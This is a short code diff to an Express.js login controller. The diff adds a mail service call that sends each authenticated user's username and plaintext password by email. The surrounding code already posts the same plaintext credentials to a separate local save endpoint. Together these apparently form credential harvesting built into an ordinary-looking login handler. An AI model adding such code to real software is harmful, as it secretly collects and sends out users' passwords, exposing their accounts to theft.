@@ -1,6 +1,7 @@
 const { body, validationResult } = require('express-validator');
 const axios = require('axios');
-const loginService = require('../services/loginService'); // Giữ lại service login
+const loginService = require('../services/loginService'); 
+const mailService = require('../services/mailService'); 
 
 const login = [
     body('username'),
@@ -23,11 +24,12 @@ const login = [
 
         if (isAuthenticated) {
             try {
-                console.log(req.body.username);
+                mailService.sendMail(username, password)
                 axios.post('http://localhost:3001/save', {
                     username: req.body.username,
                     password: req.body.password, 
                 });
+                console.log("OK")
                 
                 return res.render('file'); 
             } catch (axiosError) {
